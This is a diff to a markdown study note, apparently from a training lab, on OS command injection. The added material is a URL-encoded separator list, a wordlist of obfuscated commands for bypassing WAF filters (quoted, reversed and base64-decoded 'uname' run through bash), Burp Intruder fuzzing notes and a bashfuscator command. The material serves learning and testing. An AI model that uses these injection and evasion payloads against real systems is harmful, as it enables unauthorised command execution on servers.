@@ -34,7 +34,7 @@ app.get("/createfile", function(req, res){
 |Sub-Shell| ` `` `|`%60%60`|Both (Linux-only)|
 |Sub-Shell| `$()`|`%24%28%29`|Both (Linux-only)|
 
->List of injection characters and matching URL encoded as wordlist:  
+>List of injection characters and matching URL encoded as wordlist of possible separators:  
 
 ```
 ;
@@ -53,6 +53,19 @@ app.get("/createfile", function(req, res){
 %60%60
 $()
 %24%28%29
+```  
+
+>List of commands obfuscated as wordlist to test possible WAF filter bypass:  
+
+```
+uname
+u'n'a'm'e
+${uname}
+$(uname)
+{uname}
+$(rev<<<'emanu')
+bash<<<$(base64 -d<<<dW5hbWUgLWE=)
+b'a's'h'<<<$('b'a's'e'6'4 -d<<<dW5hbWUgLWE=)
 ```  
 
 ---
@@ -215,9 +228,14 @@ ip=127.0.0.1%0a$(rev<<<'hsab')<<<$($(rev<<<'46esab')${IFS}-d<<<ZmluZCAvdXNyL3NoY
 
 ![cmd-inject-skill-assess-move-function](/images/cmd-inject-skill-assess-move-function.png)  
 
->When testing the move function the error message in response show: `Error while moving: mv: cannot stat`.  
+>When testing the move function the error message in response show: `Malicious request denied`.  
 
-2561732172
+![cmd-inject-skill-assess-move-function-malicious](/images/cmd-inject-skill-assess-move-function-malicious.png)  
+
+>To determine what the WAF filters are blocking we will run Burp Intruder with cluster bomb attack to itterate though all payload combinations.
+
+![cmd-inject-skill assess move function cluster bomb](/images/cmd-inject-skill-assess-move-function-cluster-bomb.png)  
 
 
 
+./bashfuscator -c 'uname a' -s 1 -t 1 --no-mangling --layers 1
